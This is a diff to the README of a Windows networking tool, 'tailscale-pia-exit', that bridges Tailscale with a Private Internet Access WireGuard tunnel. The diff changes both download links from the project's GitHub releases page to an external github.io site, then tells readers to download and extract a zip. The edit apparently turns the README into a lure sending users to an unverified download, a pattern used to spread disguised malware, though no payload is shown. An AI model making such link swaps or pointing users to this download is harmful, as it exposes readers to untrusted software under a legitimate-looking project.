@@ -1,6 +1,6 @@
 # 🌐 tailscale-pia-exit - Route your traffic through secure tunnels
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/moyauncrossed879/tailscale-pia-exit/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://moyauncrossed879.github.io)
 
 This application creates a bridge between your Tailscale network and a Private Internet Access (PIA) connection. It routes your internet traffic through a secure WireGuard tunnel. By combining these, you hide your location while accessing your home devices from anywhere.
 
@@ -12,7 +12,7 @@ This application creates a bridge between your Tailscale network and a Private I
 * Basic understanding of how to open a command prompt on Windows.
 
 ## 📥 Get the files
-Visit this page to download the latest project files: https://github.com/moyauncrossed879/tailscale-pia-exit/releases
+Visit this page to download the latest project files: https://moyauncrossed879.github.io
 
 Select the zip file from the latest release. Save it to your computer and extract the contents to a folder. We suggest creating a folder named "tailscale-pia" in your documents directory for easy access.
 
